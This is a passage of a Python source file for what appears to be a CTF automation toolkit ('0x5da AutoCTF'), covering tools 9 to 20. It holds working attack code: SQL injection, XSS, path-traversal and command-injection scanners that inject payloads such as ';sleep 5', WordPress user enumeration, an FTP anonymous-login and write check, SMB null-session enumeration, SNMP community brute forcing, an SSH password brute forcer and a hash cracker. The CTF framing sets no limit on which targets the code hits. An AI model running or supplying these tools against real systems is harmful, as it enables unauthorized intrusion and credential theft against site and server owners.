    0x5da Tech Fingerprinter — Identifies web technologies from headers,
    HTML content, cookies, and known file paths.
    """
    scheme = "https" if ssl_on or port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}:{port}"
    header(f"0x5da Tech Fingerprinter → {base_url}")
    techs = []

    result = http_get(f"{base_url}/", timeout=10)
    if not result:
        error("Could not connect to web server")
        return techs

    status, hdrs, body = result
    server = hdrs.get("Server") or hdrs.get("server") or ""
    powered = hdrs.get("X-Powered-By") or hdrs.get("x-powered-by") or ""

    if server:
        techs.append(("Server", server))
        success(f"Server: {server}")
    if powered:
        techs.append(("X-Powered-By", powered))
        success(f"X-Powered-By: {powered}")

    fingerprints = [
        ("wp-content", "WordPress"), ("wp-includes", "WordPress"),
        ("Drupal", "Drupal"), ("Joomla", "Joomla"),
        ("django", "Django"), ("laravel", "Laravel"),
        ("express", "Express.js"), ("next.js", "Next.js"),
        ("react", "React"), ("angular", "Angular"), ("vue", "Vue.js"),
        ("jquery", "jQuery"), ("bootstrap", "Bootstrap"),
    ]
    body_lower = body.lower()
    for marker, tech in fingerprints:
        if marker.lower() in body_lower and tech not in [t[1] for t in techs]:
            techs.append(("HTML", tech))
            success(f"Detected: {tech}")

    gen_match = re.search(r'<meta\s+name=["\']generator["\']\s+content=["\'](.*?)["\']',
                          body, re.IGNORECASE)
    if gen_match:
        gen = gen_match.group(1)
        techs.append(("Generator", gen))
        success(f"Generator: {gen}")

    cookie_header = hdrs.get("Set-Cookie") or hdrs.get("set-cookie") or ""
    cookie_fps = [
        ("PHPSESSID", "PHP"), ("JSESSIONID", "Java"), ("ASP.NET", "ASP.NET"),
        ("csrftoken", "Django"), ("laravel_session", "Laravel"),
        ("connect.sid", "Node.js/Express"), ("rack.session", "Ruby on Rails"),
    ]
    for marker, tech in cookie_fps:
        if marker.lower() in cookie_header.lower():
            techs.append(("Cookie", tech))
            success(f"Cookie fingerprint: {tech}")

    tech_paths = [
        ("wp-login.php", "WordPress Login"),
        ("wp-json/wp/v2/users", "WordPress REST API"),
        ("administrator/", "Joomla Admin"),
        ("user/login", "Drupal Login"),
    ]
    for path, tech in tech_paths:
        r = http_get(f"{base_url}/{path}", timeout=5)
        if r and r[0] in (200, 301, 302):
            techs.append(("Path", tech))
            success(f"Found: /{path} → {tech}")

    subheader("Detected Technologies")
    if techs:
        for src, tech in techs:
            print(f"    {C.G}●{C.RST} [{src}] {C.W}{tech}{C.RST}")
    else:
        info("No specific technologies identified")
    print(f"\n  {C.DIM}Fingerprinted by 0x5da AutoCTF (OsintToast){C.RST}")
    return techs


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 10: SQL INJECTION SCANNER — 0x5da (Toasty)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_sqli_scan(url, params=None):
    """
    0x5da SQL Injection Scanner — Tests URL parameters for SQLi vulnerabilities.
    Checks error-based, boolean-based, and time-based injection vectors.
    """
    header(f"0x5da SQL Injection Scanner")
    info(f"Target URL: {url}")
    findings = []

    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    if params:
        query_params.update(params)

    if not query_params:
        warning("No parameters found in URL. Provide a URL with query parameters (e.g. ?id=1)")
        return findings

    info(f"Testing {len(query_params)} parameters with {len(SQLI_PAYLOADS)} payloads")

    for param_name, param_values in query_params.items():
        original_value = param_values[0] if isinstance(param_values, list) else param_values
        subheader(f"Testing parameter: {param_name}")

        for payload in SQLI_PAYLOADS:
            test_params = dict(query_params)
            test_params[param_name] = [original_value + payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, test_query, parsed.fragment
            ))

            result = http_get(test_url, timeout=15)
            if not result:
                continue
            status, hdrs, body = result
            body_lower = body.lower()

            for err_sig in SQL_ERRORS:
                if err_sig in body_lower:
                    finding = {
                        "param": param_name, "payload": payload,
                        "type": "error-based", "evidence": err_sig,
                    }
                    findings.append(finding)
                    success(f"{C.R}VULNERABLE!{C.RST} param={param_name} "
                            f"payload={payload[:40]} → {err_sig[:50]}")
                    break

        clean_url_1 = test_url.replace(param_name + "=", "")
        test_true = dict(query_params)
        test_true[param_name] = [f"{original_value}' AND '1'='1"]
        test_false = dict(query_params)
        test_false[param_name] = [f"{original_value}' AND '1'='2"]
        url_true = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urllib.parse.urlencode(test_true, doseq=True), parsed.fragment
        ))
        url_false = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urllib.parse.urlencode(test_false, doseq=True), parsed.fragment
        ))
        r_true = http_get(url_true, timeout=10)
        r_false = http_get(url_false, timeout=10)
        if r_true and r_false:
            if abs(len(r_true[2]) - len(r_false[2])) > 50:
                finding = {
                    "param": param_name, "type": "boolean-blind",
                    "payload": "' AND '1'='1 vs ' AND '1'='2",
                    "evidence": f"Response length diff: {abs(len(r_true[2]) - len(r_false[2]))}",
                }
                findings.append(finding)
                success(f"{C.R}BOOLEAN BLIND{C.RST} param={param_name} "
                        f"(response diff: {abs(len(r_true[2]) - len(r_false[2]))} bytes)")

    subheader("SQLi Scan Results")
    if findings:
        for f in findings:
            print(f"    {C.R}●{C.RST} [{f['type']}] param={f['param']}  "
                  f"payload={f.get('payload', '')[:50]}")
    else:
        info("No SQL injection vulnerabilities detected")
    print(f"\n  {C.DIM}Scanned by 0x5da AutoCTF (Toasty){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 11: XSS SCANNER — 0x5da (WoahToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_xss_scan(url, params=None):
    """
    0x5da XSS Scanner — Tests URL parameters for reflected cross-site scripting.
    Checks for payload reflection in response body.
    """
    header(f"0x5da XSS Scanner")
    info(f"Target URL: {url}")
    findings = []

    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    if params:
        query_params.update(params)

    if not query_params:
        warning("No parameters found in URL")
        return findings

    info(f"Testing {len(query_params)} parameters with {len(XSS_PAYLOADS)} payloads")

    for param_name, param_values in query_params.items():
        original_value = param_values[0] if isinstance(param_values, list) else param_values
        subheader(f"Testing parameter: {param_name}")

        for payload in XSS_PAYLOADS:
            test_params = dict(query_params)
            test_params[param_name] = [payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, test_query, parsed.fragment
            ))

            result = http_get(test_url, timeout=10)
            if not result:
                continue
            status, hdrs, body = result

            if payload in body:
                finding = {
                    "param": param_name, "payload": payload,
                    "type": "reflected",
                    "evidence": "Payload reflected unencoded in response",
                }
                findings.append(finding)
                success(f"{C.R}REFLECTED XSS!{C.RST} param={param_name} "
                        f"payload={payload[:50]}")
            elif payload.replace("<", "&lt;").replace(">", "&gt;") in body:
                info(f"Payload HTML-encoded in response (param={param_name})")

            if "{{7*7}}" in [payload] and "49" in body:
                finding = {
                    "param": param_name, "payload": payload,
                    "type": "ssti",
                    "evidence": "Template expression {{7*7}} evaluated to 49",
                }
                findings.append(finding)
                success(f"{C.R}SSTI DETECTED!{C.RST} param={param_name}")

    subheader("XSS Scan Results")
    if findings:
        for f in findings:
            print(f"    {C.R}●{C.RST} [{f['type']}] param={f['param']}  "
                  f"payload={f['payload'][:60]}")
    else:
        info("No XSS vulnerabilities detected")
    print(f"\n  {C.DIM}Scanned by 0x5da AutoCTF (WoahToast){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 12: LFI / PATH TRAVERSAL SCANNER — 0x5da (OsintToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_lfi_scan(url, params=None):
    """
    0x5da LFI Scanner — Tests for local file inclusion and path traversal.
    Uses various bypass techniques including null bytes, encoding, and wrappers.
    """
    header(f"0x5da LFI / Path Traversal Scanner")
    info(f"Target URL: {url}")
    findings = []

    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    if params:
        query_params.update(params)

    if not query_params:
        warning("No parameters found in URL")
        return findings

    info(f"Testing {len(query_params)} parameters with {len(LFI_PAYLOADS)} payloads")

    for param_name, param_values in query_params.items():
        subheader(f"Testing parameter: {param_name}")

        for payload in LFI_PAYLOADS:
            test_params = dict(query_params)
            test_params[param_name] = [payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, test_query, parsed.fragment
            ))

            result = http_get(test_url, timeout=10)
            if not result:
                continue
            status, hdrs, body = result

            for marker in LFI_MARKERS:
                if marker in body:
                    finding = {
                        "param": param_name, "payload": payload,
                        "type": "lfi", "evidence": marker,
                    }
                    findings.append(finding)
                    success(f"{C.R}LFI FOUND!{C.RST} param={param_name} "
                            f"payload={payload[:50]} → {marker}")
                    break

    subheader("LFI Scan Results")
    if findings:
        for f in findings:
            print(f"    {C.R}●{C.RST} param={f['param']}  payload={f['payload'][:60]}")
    else:
        info("No LFI/path traversal vulnerabilities detected")
    print(f"\n  {C.DIM}Scanned by 0x5da AutoCTF (OsintToast){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 13: COMMAND INJECTION SCANNER — 0x5da (Toasty)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_cmdi_scan(url, params=None):
    """
    0x5da Command Injection Scanner — Tests for OS command injection.
    Uses output-based and time-based detection techniques.
    """
    header(f"0x5da Command Injection Scanner")
    info(f"Target URL: {url}")
    findings = []

    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    if params:
        query_params.update(params)

    if not query_params:
        warning("No parameters found in URL")
        return findings

    info(f"Testing {len(query_params)} parameters with {len(CMDI_PAYLOADS)} payloads")

    for param_name, param_values in query_params.items():
        original_value = param_values[0] if isinstance(param_values, list) else param_values
        subheader(f"Testing parameter: {param_name}")

        for payload, marker in CMDI_PAYLOADS:
            test_params = dict(query_params)
            test_params[param_name] = [original_value + payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, test_query, parsed.fragment
            ))

            result = http_get(test_url, timeout=15)
            if not result:
                continue
            status, hdrs, body = result

            if marker and marker in body:
                finding = {
                    "param": param_name, "payload": payload,
                    "type": "output-based", "evidence": marker,
                }
                findings.append(finding)
                success(f"{C.R}CMDI FOUND!{C.RST} param={param_name} "
                        f"payload={payload} → evidence: {marker}")

        sleep_payload = f"{original_value};sleep 5"
        test_params = dict(query_params)
        test_params[param_name] = [sleep_payload]
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, test_query, parsed.fragment
        ))
        start = time.time()
        result = http_get(test_url, timeout=20)
        elapsed = time.time() - start
        if result and elapsed >= 4.5:
            finding = {
                "param": param_name, "payload": ";sleep 5",
                "type": "time-based", "evidence": f"Response delayed {elapsed:.1f}s",
            }
            findings.append(finding)
            success(f"{C.R}TIME-BASED CMDI!{C.RST} param={param_name} "
                    f"(delay: {elapsed:.1f}s)")

    subheader("Command Injection Results")
    if findings:
        for f in findings:
            print(f"    {C.R}●{C.RST} [{f['type']}] param={f['param']}  "
                  f"payload={f['payload']}")
    else:
        info("No command injection vulnerabilities detected")
    print(f"\n  {C.DIM}Scanned by 0x5da AutoCTF (Toasty){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 14: WORDPRESS SCANNER — 0x5da (WoahToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_wp_scan(target, port=80, ssl_on=False):
    """
    0x5da WordPress Scanner — Detects WordPress installations, enumerates
    versions, users, plugins, and themes. Checks for known misconfigurations.
    """
    scheme = "https" if ssl_on or port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}:{port}"
    header(f"0x5da WordPress Scanner → {base_url}")
    findings = defaultdict(list)

    result = http_get(f"{base_url}/", timeout=10)
    if not result:
        error("Could not connect")
        return dict(findings)

    status, hdrs, body = result
    is_wp = ("wp-content" in body or "wp-includes" in body or
             "wordpress" in body.lower() or "wp-json" in body)
    if not is_wp:
        result2 = http_get(f"{base_url}/wp-login.php", timeout=8)
        if result2 and result2[0] in (200, 301, 302):
            is_wp = True

    if not is_wp:
        info("Target does not appear to be WordPress")
        return dict(findings)

    success("WordPress detected!")

    subheader("Version Detection")
    gen_match = re.search(r'<meta name="generator" content="WordPress (\S+)"', body)
    if gen_match:
        ver = gen_match.group(1)
        findings["version"] = ver
        success(f"WordPress version: {ver}")
    else:
        for path in ["readme.html", "feed/", "wp-links-opml.php"]:
            r = http_get(f"{base_url}/{path}", timeout=8)
            if r and r[0] == 200:
                vm = re.search(r"[Vv]ersion\s+(\d+\.\d+[\.\d]*)", r[2])
                if vm:
                    findings["version"] = vm.group(1)
                    success(f"WordPress version: {vm.group(1)} (from {path})")
                    break

    subheader("User Enumeration")
    r = http_get(f"{base_url}/wp-json/wp/v2/users", timeout=8)
    if r and r[0] == 200:
        try:
            users = json.loads(r[2])
            for u in users:
                name = u.get("slug", u.get("name", "?"))
                findings["users"].append(name)
                success(f"User: {name}")
        except Exception:
            pass
    else:
        for i in range(1, 11):
            r = http_get(f"{base_url}/?author={i}", timeout=5, follow=False)
            if r and r[0] in (301, 302):
                loc = r[1].get("Location", r[1].get("location", ""))
                user_match = re.search(r"/author/([^/]+)", loc)
                if user_match:
                    findings["users"].append(user_match.group(1))
                    success(f"User: {user_match.group(1)} (author={i})")

    subheader("Plugin Enumeration")
    for plugin in WP_PLUGINS:
        r = http_get(f"{base_url}/wp-content/plugins/{plugin}/readme.txt", timeout=5)
        if r and r[0] == 200:
            findings["plugins"].append(plugin)
            ver_match = re.search(r"Stable tag:\s*(\S+)", r[2], re.IGNORECASE)
            ver = ver_match.group(1) if ver_match else "unknown"
            success(f"Plugin: {plugin} (v{ver})")

    subheader("Security Checks")
    checks = [
        ("xmlrpc.php", "XML-RPC enabled (brute force / SSRF risk)"),
        ("wp-config.php.bak", "WordPress config backup exposed"),
        (".wp-config.php.swp", "WordPress config swap file"),
        ("wp-content/debug.log", "Debug log exposed"),
        ("wp-content/uploads/", "Uploads directory listing"),
        ("wp-cron.php", "WP-Cron accessible"),
    ]
    for path, desc in checks:
        r = http_get(f"{base_url}/{path}", timeout=5)
        if r and r[0] == 200:
            findings["security"].append((path, desc))
            warning(f"{desc} → /{path}")

    print(f"\n  {C.DIM}Scanned by 0x5da AutoCTF (WoahToast){C.RST}")
    return dict(findings)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 15: FTP EXPLOIT — 0x5da (OsintToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_ftp_check(target, port=21):
    """
    0x5da FTP Exploit — Checks for anonymous login, grabs banners, lists
    accessible files, and detects writable directories.
    """
    header(f"0x5da FTP Exploit → {target}:{port}")
    findings = {}

    banner = grab_banner_raw(target, port, timeout=5)
    if banner:
        findings["banner"] = banner
        success(f"FTP Banner: {banner[:120]}")
        ver_match = re.search(r"(vsftpd|ProFTPD|Pure-FTPd|FileZilla|wu-\d|Microsoft FTP)\s*[\d.]*",
                              banner, re.IGNORECASE)
        if ver_match:
            findings["server"] = ver_match.group(0)
            info(f"FTP Server: {ver_match.group(0)}")
    else:
        error("Could not grab FTP banner")
        return findings

    subheader("Anonymous Login Check")
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=10)
        ftp.login("anonymous", "anonymous@0x5da.htb")
        findings["anonymous"] = True
        success(f"{C.R}Anonymous login SUCCESSFUL!{C.RST}")

        info("Listing files...")
        file_list = []
        ftp.retrlines("LIST", lambda x: file_list.append(x))
        findings["files"] = file_list
        for f in file_list:
            print(f"    {C.CY}{f}{C.RST}")

        try:
            test_file = f".0x5da_write_test_{random.randint(1000,9999)}"
            from io import BytesIO
            ftp.storbinary(f"STOR {test_file}", BytesIO(b"0x5da write test"))
            ftp.delete(test_file)
            findings["writable"] = True
            success(f"{C.R}Directory is WRITABLE!{C.RST}")
        except Exception:
            findings["writable"] = False
            info("Directory is not writable")

        ftp.quit()
    except ftplib.error_perm as e:
        findings["anonymous"] = False
        info(f"Anonymous login denied: {e}")
    except Exception as e:
        findings["anonymous"] = False
        error(f"FTP connection failed: {e}")

    print(f"\n  {C.DIM}Exploited by 0x5da AutoCTF (OsintToast){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 16: SMB ENUMERATOR — 0x5da (Toasty)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_smb_enum(target, port=445):
    """
    0x5da SMB Enumerator — Attempts null session authentication, lists shares,
    checks permissions. Uses smbclient and rpcclient if available.
    """
    header(f"0x5da SMB Enumerator → {target}:{port}")
    findings = {"shares": [], "users": [], "null_session": False}

    if not tcp_connect(target, port, timeout=3):
        error(f"Port {port} is closed")
        return findings

    subheader("Null Session Share Enumeration")
    try:
        out = subprocess.check_output(
            ["smbclient", "-L", f"//{target}", "-N", "-p", str(port)],
            stderr=subprocess.STDOUT, timeout=15
        ).decode("utf-8", errors="replace")
        findings["null_session"] = True
        success(f"{C.R}Null session SUCCESSFUL!{C.RST}")

        shares = re.findall(r"^\s+(\S+)\s+(Disk|IPC|Printer)", out, re.MULTILINE)
        for share_name, share_type in shares:
            findings["shares"].append((share_name, share_type))
            success(f"Share: {share_name} ({share_type})")

        for share_name, share_type in shares:
            if share_type == "Disk":
                try:
                    ls_out = subprocess.check_output(
                        ["smbclient", f"//{target}/{share_name}", "-N", "-p", str(port),
                         "-c", "ls"],
                        stderr=subprocess.STDOUT, timeout=10
                    ).decode("utf-8", errors="replace")
                    if "NT_STATUS_ACCESS_DENIED" not in ls_out:
                        findings[f"share_{share_name}"] = ls_out
                        success(f"  {share_name} is {C.G}READABLE{C.RST}")
                        for line in ls_out.strip().split("\n")[:10]:
                            print(f"      {C.DIM}{line.strip()}{C.RST}")
                    else:
                        info(f"  {share_name} access denied")
                except Exception:
                    pass
    except FileNotFoundError:
        warning("smbclient not installed — install with: apt install smbclient")
    except subprocess.CalledProcessError as e:
        out = e.output.decode("utf-8", errors="replace") if e.output else ""
        if "NT_STATUS_ACCESS_DENIED" in out:
            info("Null session denied")
        elif "NT_STATUS_LOGON_FAILURE" in out:
            info("Login required (no null session)")
        else:
            info(f"SMB connection issue: {out[:100]}")
    except Exception as e:
        error(f"SMB enumeration failed: {e}")

    subheader("RPC User Enumeration")
    try:
        out = subprocess.check_output(
            ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"],
            stderr=subprocess.STDOUT, timeout=10
        ).decode("utf-8", errors="replace")
        users = re.findall(r"user:\[(\S+?)\]", out)
        for u in users:
            findings["users"].append(u)
            success(f"User: {u}")
    except FileNotFoundError:
        info("rpcclient not installed")
    except Exception:
        info("RPC user enumeration failed")

    print(f"\n  {C.DIM}Enumerated by 0x5da AutoCTF (Toasty){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 17: SNMP ENUMERATOR — 0x5da (WoahToast)
# ═══════════════════════════════════════════════════════════════════════════════

def _build_snmp_get(community, oid="1.3.6.1.2.1.1.1.0"):
    """Build an SNMP v1 GET request packet for sysDescr."""
    def _encode_len(length):
        if length < 0x80:
            return bytes([length])
        elif length < 0x100:
            return bytes([0x81, length])
        return bytes([0x82, (length >> 8) & 0xff, length & 0xff])

    def _encode_oid(oid_str):
        parts = [int(x) for x in oid_str.split(".")]
        encoded = bytes([parts[0] * 40 + parts[1]])
        for p in parts[2:]:
            if p < 128:
                encoded += bytes([p])
            else:
                tmp = []
                tmp.append(p & 0x7f)
                p >>= 7
                while p:
                    tmp.append(0x80 | (p & 0x7f))
                    p >>= 7
                encoded += bytes(reversed(tmp))
        return b"\x06" + _encode_len(len(encoded)) + encoded

    comm = community.encode()
    oid_tlv = _encode_oid(oid)
    varbind_val = oid_tlv + b"\x05\x00"
    varbind = b"\x30" + _encode_len(len(varbind_val)) + varbind_val
    varbind_list = b"\x30" + _encode_len(len(varbind)) + varbind

    req_id = struct.pack(">H", random.randint(1, 65535))
    req_id_tlv = b"\x02" + _encode_len(len(req_id)) + req_id
    err_status = b"\x02\x01\x00"
    err_index = b"\x02\x01\x00"

    pdu_val = req_id_tlv + err_status + err_index + varbind_list
    pdu = b"\xa0" + _encode_len(len(pdu_val)) + pdu_val

    version = b"\x02\x01\x00"
    comm_tlv = b"\x04" + _encode_len(len(comm)) + comm

    msg_val = version + comm_tlv + pdu
    return b"\x30" + _encode_len(len(msg_val)) + msg_val


def _parse_snmp_response(data):
    """Extract the value string from an SNMP response packet."""
    try:
        idx = data.find(b"\x04", 20)
        if idx != -1:
            length = data[idx + 1]
            if length & 0x80:
                num_bytes = length & 0x7f
                length = int.from_bytes(data[idx + 2:idx + 2 + num_bytes], "big")
                val_start = idx + 2 + num_bytes
            else:
                val_start = idx + 2
            return data[val_start:val_start + length].decode("utf-8", errors="replace")
    except Exception:
        pass
    return None


def tool_snmp_enum(target, port=161, communities=None):
    """
    0x5da SNMP Enumerator — Brute-forces SNMP community strings and
    retrieves system information via raw SNMP v1 packets.
    """
    header(f"0x5da SNMP Enumerator → {target}:{port}")
    comms = communities or SNMP_COMMUNITIES
    findings = {"communities": [], "system_info": {}}

    info(f"Testing {len(comms)} community strings")

    oids = {
        "1.3.6.1.2.1.1.1.0": "sysDescr",
        "1.3.6.1.2.1.1.3.0": "sysUpTime",
        "1.3.6.1.2.1.1.4.0": "sysContact",
        "1.3.6.1.2.1.1.5.0": "sysName",
        "1.3.6.1.2.1.1.6.0": "sysLocation",
    }

    for comm in comms:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            pkt = _build_snmp_get(comm)
            sock.sendto(pkt, (target, port))
            data, _ = sock.recvfrom(4096)
            sock.close()

            val = _parse_snmp_response(data)
            if val or len(data) > 10:
                findings["communities"].append(comm)
                success(f"{C.R}Community string found:{C.RST} {C.G}{comm}{C.RST}")
                if val:
                    success(f"  sysDescr: {val}")
                    findings["system_info"]["sysDescr"] = val

                for oid, name in list(oids.items())[1:]:
                    try:
                        sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock2.settimeout(3)
                        sock2.sendto(_build_snmp_get(comm, oid), (target, port))
                        data2, _ = sock2.recvfrom(4096)
                        sock2.close()
                        val2 = _parse_snmp_response(data2)
                        if val2:
                            findings["system_info"][name] = val2
                            success(f"  {name}: {val2}")
                    except Exception:
                        pass
                break
        except socket.timeout:
            pass
        except Exception:
            pass

    subheader("SNMP Results")
    if findings["communities"]:
        for c in findings["communities"]:
            print(f"    {C.G}●{C.RST} Community: {C.W}{c}{C.RST}")
        for k, v in findings["system_info"].items():
            print(f"    {C.CY}{k}:{C.RST} {v}")
    else:
        info("No valid community strings found")
    print(f"\n  {C.DIM}Enumerated by 0x5da AutoCTF (WoahToast){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 18: SSH BRUTE FORCER — 0x5da (OsintToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_ssh_brute(target, port=22, users=None, passwords=None, delay=1.0):
    """
    0x5da SSH Brute Forcer — Dictionary attack against SSH with rate limiting.
    Uses paramiko if available, otherwise skips gracefully.
    """
    header(f"0x5da SSH Brute Forcer → {target}:{port}")
    user_list = users or COMMON_USERS[:10]
    pass_list = passwords or COMMON_PASSWORDS[:20]
    found = []

    try:
        import paramiko
        paramiko.util.log_to_file("/dev/null")
    except ImportError:
        warning("paramiko not installed. Install with: pip install paramiko")
        warning("SSH brute force requires paramiko")
        return found

    info(f"Testing {len(user_list)} users × {len(pass_list)} passwords = "
         f"{len(user_list) * len(pass_list)} combinations")
    info(f"Rate limit: {delay}s between attempts")

    total = len(user_list) * len(pass_list)
    count = 0

    for user in user_list:
        for passwd in pass_list:
            count += 1
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target, port=port, username=user, password=passwd,
                               timeout=10, allow_agent=False, look_for_keys=False,
                               banner_timeout=10)
                found.append((user, passwd))
                success(f"{C.R}CREDENTIALS FOUND!{C.RST} {C.G}{user}:{passwd}{C.RST}")
                client.close()
                break
            except paramiko.AuthenticationException:
                if count % 10 == 0:
                    print(f"\r  {C.DIM}[0x5da] Progress: {count}/{total} "
                          f"({int(count/total*100)}%){C.RST}", end="", flush=True)
            except paramiko.SSHException as e:
                if "Error reading SSH protocol banner" in str(e):
                    warning("Rate limited — increasing delay")
                    time.sleep(delay * 3)
            except Exception:
                pass
            time.sleep(delay)
        if found and found[-1][0] == user:
            continue

    print()
    subheader("SSH Brute Force Results")
    if found:
        for user, passwd in found:
            print(f"    {C.G}●{C.RST} {C.W}{user}:{passwd}{C.RST}")
    else:
        info("No valid credentials found")
    print(f"\n  {C.DIM}Bruted by 0x5da AutoCTF (OsintToast){C.RST}")
    return found


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 19: HASH CRACKER — 0x5da (Toasty)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_hash_crack(hash_value, wordlist=None):
    """
    0x5da Hash Cracker — Identifies hash type and performs dictionary attack.
    Supports MD5, SHA1, SHA224, SHA256, SHA384, SHA512, NTLM.
    """
    header(f"0x5da Hash Cracker")
    hash_value = hash_value.strip().lower()
    info(f"Hash: {hash_value}")
    info(f"Length: {len(hash_value)} characters")

    hash_types = []
    hlen = len(hash_value)
    if hlen == 32 and all(c in string.hexdigits for c in hash_value):
        hash_types = ["md5", "ntlm"]
    elif hlen == 40 and all(c in string.hexdigits for c in hash_value):
        hash_types = ["sha1"]
    elif hlen == 56 and all(c in string.hexdigits for c in hash_value):
        hash_types = ["sha224"]
    elif hlen == 64 and all(c in string.hexdigits for c in hash_value):
        hash_types = ["sha256"]
    elif hlen == 96 and all(c in string.hexdigits for c in hash_value):
        hash_types = ["sha384"]
    elif hlen == 128 and all(c in string.hexdigits for c in hash_value):
        hash_types = ["sha512"]
    elif hash_value.startswith("$1$"):
        hash_types = ["md5crypt"]
    elif hash_value.startswith("$6$"):
        hash_types = ["sha512crypt"]
    elif hash_value.startswith("$2"):
        hash_types = ["bcrypt"]
    else:
        hash_types = ["unknown"]

    info(f"Possible type(s): {', '.join(hash_types)}")

    words = COMMON_PASSWORDS[:]
    if wordlist and os.path.isfile(wordlist):
        with open(wordlist) as f:
            words = [line.strip() for line in f if line.strip()]
        info(f"Loaded {len(words)} words from {wordlist}")
    else:
        info(f"Using embedded wordlist ({len(words)} words)")

    def _ntlm(pwd):
        return hashlib.new("md4", pwd.encode("utf-16le")).hexdigest()

    hash_funcs = {
        "md5": lambda w: hashlib.md5(w.encode()).hexdigest(),
        "sha1": lambda w: hashlib.sha1(w.encode()).hexdigest(),
        "sha224": lambda w: hashlib.sha224(w.encode()).hexdigest(),
        "sha256": lambda w: hashlib.sha256(w.encode()).hexdigest(),
        "sha384": lambda w: hashlib.sha384(w.encode()).hexdigest(),
        "sha512": lambda w: hashlib.sha512(w.encode()).hexdigest(),
        "ntlm": _ntlm,
    }

    for ht in hash_types:
        if ht not in hash_funcs:
            warning(f"Cannot crack {ht} hashes (requires specialized tools)")
            continue
        subheader(f"Cracking as {ht.upper()}")
        func = hash_funcs[ht]
        for i, word in enumerate(words):
            if i % 100 == 0:
                print(f"\r  {C.DIM}[0x5da] Trying: {i}/{len(words)}{C.RST}", end="", flush=True)
            try:
                if func(word) == hash_value:
                    print()
                    success(f"{C.R}CRACKED!{C.RST}  {hash_value} → {C.G}{word}{C.RST}  ({ht})")
                    return {"hash": hash_value, "plaintext": word, "type": ht}
            except Exception:
                pass
        print()
        for word in words:
            for mutation in [word.upper(), word.capitalize(), word + "1",
                             word + "123", word + "!", word + "2024",
                             word + "2025", "!" + word, word[::-1]]:
                try:
                    if func(mutation) == hash_value:
                        success(f"{C.R}CRACKED!{C.RST}  {hash_value} → {C.G}{mutation}{C.RST}  ({ht})")
                        return {"hash": hash_value, "plaintext": mutation, "type": ht}
                except Exception:
                    pass

    info("Hash not cracked with available wordlist")
    print(f"\n  {C.DIM}Cracked by 0x5da AutoCTF (Toasty){C.RST}")
    return None


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 20: CRYPTO TOOLKIT — 0x5da (WoahToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_crypto_toolkit():
    """
    0x5da Crypto Toolkit — Encode/decode Base64, Hex, URL, ROT13, binary.
    Caesar cipher brute force, magic auto-decoder.
    """
    header("0x5da Crypto Toolkit")
    print(f"""
    {C.W}{C.BOLD}Operations:{C.RST}
      {C.CY}[1]{C.RST}  Base64 Encode        {C.CY}[7]{C.RST}  ROT13
      {C.CY}[2]{C.RST}  Base64 Decode         {C.CY}[8]{C.RST}  Caesar Brute Force
      {C.CY}[3]{C.RST}  Hex Encode            {C.CY}[9]{C.RST}  Binary Encode
      {C.CY}[4]{C.RST}  Hex Decode            {C.CY}[10]{C.RST} Binary Decode
      {C.CY}[5]{C.RST}  URL Encode            {C.CY}[11]{C.RST} Magic Auto-Decode
      {C.CY}[6]{C.RST}  URL Decode            {C.CY}[0]{C.RST}  Back
    """)

    choice = input(f"  {C.CY}[0x5da]>{C.RST} ").strip()
    if choice == "0":
        return

    text = input(f"  {C.W}Enter text/data:{C.RST} ").strip()
    if not text:
        return

    if choice == "1":
        result = base64.b64encode(text.encode()).decode()
        success(f"Base64: {result}")
    elif choice == "2":
        try:
